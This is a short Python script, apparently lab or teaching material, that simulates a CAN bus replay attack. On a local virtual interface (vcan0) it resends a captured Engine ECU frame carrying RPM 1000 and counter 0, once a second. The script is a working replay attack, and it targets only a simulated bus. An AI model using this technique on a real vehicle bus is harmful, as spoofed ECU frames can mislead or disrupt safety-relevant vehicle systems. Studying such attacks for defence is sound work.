import can
import time

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)

print("=" * 50)
print(" CAN REPLAY ATTACK SIMULATOR")
print("=" * 50)
print("Target: local vcan0")
print("Replaying a previously valid Engine ECU frame")
print("Press CTRL+C to stop.")
print()

# Previously captured legitimate frame:
# RPM = 1000
# Counter = 0
#
# RPM 1000 = 0x03E8
# Counter = 0x00
#
# Complete payload:
# 03 E8 00

replayed_frame = can.Message(
    arbitration_id=0x100,
    data=bytes([0x03, 0xE8, 0x00]),
    is_extended_id=False
)

try:
    while True:

        bus.send(replayed_frame)

        print(
            "REPLAY -> ID=0x100 | "
            "RPM=1000 | "
            "Counter=0"
        )

        time.sleep(1)

except KeyboardInterrupt:

    print("\nReplay simulation stopped.")

finally:

    bus.shutdown()
